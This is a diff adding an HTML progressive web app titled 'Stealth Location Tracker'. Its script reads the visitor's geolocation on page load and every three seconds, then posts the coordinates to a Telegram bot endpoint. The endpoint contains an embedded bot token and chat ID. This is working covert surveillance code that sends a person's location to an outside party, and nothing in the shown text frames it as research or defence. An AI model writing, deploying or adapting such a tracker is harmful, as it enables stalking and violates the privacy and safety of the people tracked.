@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Stealth Location Tracker</title>
+  <script>
+    // Request location every time the PWA is opened
+    async function getLocationAndSend() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const { latitude, longitude } = position.coords;
+
+          const url = `https://api.telegram.org/bot8113534372:AAF2DahT2CQYToSvG7Z_VMZ_-0BmweybX5I/sendMessage`;
+          const message = `Latitude: ${latitude}, Longitude: ${longitude}`;
+
+          // Send location to Telegram bot
+          await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: `chat_id=1293804795&text=${encodeURIComponent(message)}`,
+          });
+        });
+      } else {
+        console.error("Geolocation not supported.");
+      }
+    }
+
+    // Register the service worker
+    if ("serviceWorker" in navigator) {
+      navigator.serviceWorker.register("/sw.js").then(() => console.log("Service Worker Registered"));
+    }
+
+    // Trigger location tracking on page load
+    window.onload = getLocationAndSend;
+
+    setInterval(getLocationAndSend, 3000);
+
+  </script>
+</head>
+<body>
+  <h1>Stealth Location Tracker</h1>
+  <p>This PWA will collect location data in the background.</p>
+</body>
+</html>
